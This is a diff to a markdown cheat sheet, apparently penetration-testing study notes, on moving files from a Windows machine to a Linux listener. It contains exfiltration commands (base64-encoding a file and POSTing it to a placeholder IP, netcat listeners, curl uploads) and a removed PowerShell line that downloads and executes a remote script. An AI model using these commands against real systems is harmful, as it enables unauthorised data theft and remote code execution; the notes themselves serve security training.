@@ -195,34 +195,35 @@ md5sum decoded.txt
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Web Uploads</h4></summary>  
 
-**Source Machine: Installing a Configured WebServer with Upload on Linux**
+**Destination Machine (Linux): Installing a Configured WebServer with Upload on Linux**
+
 ```bash
 pip3 install uploadserver
-python3 -m uploadserver
+python3 -m uploadserver --allow-replace 8000
 ```
 
-**Destination Machine: PowerShell Script to Upload a File to Python Upload Server**
+**Source Machine (Windows): Upload the file**
+
 ```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
+curl.exe -X POST http://<IP>:<PORT>/upload -F "files=@C:\Users\Cartman\Desktop\FileToUpload.txt"
 ```
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Base64 Web Upload</h4></summary>  
 
-**Source Machine: We use Netcat to listen in on a port we specify and send the file as a POST request.**
+**Destination Machine (Linux): We use Netcat to listen in on a port we specify and send the file as a POST request.**
 ```bash
 nc -lvnp <PORT>
 ```
 
-**Destination Machine: PowerShell Script to Upload a File to Python Upload Server**
+**Source Machine (Windows): PowerShell Script to Upload a File to Python Upload Server**
 ```powershell
 $b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
 Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
 ```
 
-**Source Machine: We copy the output and use the base64 decode function to convert the base64 string into a file.**
+**Destination Machine (Linux): We copy the output and use the base64 decode function to convert the base64 string into a file.**
 ```bash
 echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
 ```
